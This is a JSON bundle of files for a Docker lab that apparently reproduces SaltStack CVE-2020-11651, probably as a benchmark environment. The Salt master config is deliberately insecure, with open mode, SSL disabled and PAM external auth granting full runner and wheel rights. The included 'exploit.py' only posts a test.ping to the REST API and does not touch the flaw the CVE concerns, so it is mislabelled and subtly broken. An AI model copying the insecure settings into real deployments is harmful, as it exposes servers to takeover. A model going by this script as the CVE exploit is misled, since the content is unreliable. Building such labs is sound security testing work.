{
    "files": [
        {
            "location": "./../../dockers/CVE-2020-11651/custom_no_tool/docker-compose.yml",
            "content": "version: '3.8'\n\nservices:\n  salt-master:\n    image: saltstack/salt:2019.2.3\n    container_name: salt-master\n    ports:\n      - \"4505:4505\"\n      - \"4506:4506\"\n      - \"8000:8000\"\n    volumes:\n      - ./master:/etc/salt/master\n    command: [\"salt-master\", \"-l\", \"debug\"]\n    healthcheck:\n      test: [\"CMD\", \"pgrep\", \"salt-master\"]\n      interval: 30s\n      timeout: 10s\n      retries: 5\n\n  salt-minion:\n    image: saltstack/salt:2019.2.3\n    container_name: salt-minion\n    depends_on:\n      - salt-master\n    volumes:\n      - ./minion:/etc/salt/minion\n    command: [\"salt-minion\", \"-l\", \"debug\"]\n    healthcheck:\n      test: [\"CMD\", \"pgrep\", \"salt-minion\"]\n      interval: 30s\n      timeout: 10s\n      retries: 5\n\n  python:\n    build:\n      context: ./scripts\n      dockerfile: Dockerfile\n    container_name: python\n    depends_on:\n      salt-master:\n        condition: service_healthy\n    volumes:\n      - ./scripts:/scripts\n    working_dir: /scripts\n    entrypoint: [\"python\", \"exploit.py\"]\n"
        },
        {
            "location": "./../../dockers/CVE-2020-11651/custom_no_tool/master",
            "content": "interface: 0.0.0.0\n\nfile_roots:\n  base:\n    - /srv/salt\n\npillar_roots:\n  base:\n    - /srv/pillar\n\nopen_mode: True\n\nauth_mode: 1\n\nexternal_auth:\n  pam:\n    saltuser:\n      - .*\n      - '@runner'\n      - '@wheel'\n\nrest_cherrypy:\n  port: 8000\n  host: 0.0.0.0\n  disable_ssl: True\n  debug: True\n  enable: True\n  thread_pool: 10\n  max_request_body_size: 1048576\n  socket_queue_size: 30\n  max_threads: 100\n  timeout: 300\n  log_access: True\n  log_error: True\n\norder_masters: False\n"
        },
        {
            "location": "./../../dockers/CVE-2020-11651/custom_no_tool/minion",
            "content": "master: salt-master\n\nid: minion1\n\nlog_level: debug\n"
        },
        {
            "location": "./../../dockers/CVE-2020-11651/custom_no_tool/scripts/exploit.py",
            "content": "import requests\nimport time\n\n# Exploit for CVE-2020-11651\n\ndef exploit_salt_master(host):\n    # Introduce a delay to allow the Salt master to initialize\n    time.sleep(30)\n    url = f'http://{host}:8000'\n    headers = {'Content-Type': 'application/json'}\n    data = {\n        \"client\": \"local\",\n        \"tgt\": \"*\",\n        \"fun\": \"test.ping\"\n    }\n\n    retries = 5\n    for _ in range(retries):\n        try:\n            response = requests.post(url, json=data, headers=headers)\n            print(response.text)\n            break\n        except requests.exceptions.ConnectionError:\n            print(\"Connection refused, retrying...\")\n            time.sleep(5)\n\nif __name__ == '__main__':\n    exploit_salt_master('localhost')\n"
        },
        {
            "location": "./../../dockers/CVE-2020-11651/custom_no_tool/scripts/Dockerfile",
            "content": "FROM python:3.8\n\nWORKDIR /scripts\n\nCOPY exploit.py /scripts/\n\nRUN pip install requests\n\nCMD [\"python\", \"exploit.py\"]\n"
        }
    ],
    "directory_tree": "CVE-2020-11651/\n\u2514\u2500\u2500 custom_no_tool\n    \u251c\u2500\u2500 docker-compose.yml\n    \u251c\u2500\u2500 master\n    \u251c\u2500\u2500 minion\n    \u2514\u2500\u2500 scripts\n        \u251c\u2500\u2500 Dockerfile\n        \u2514\u2500\u2500 exploit.py"
}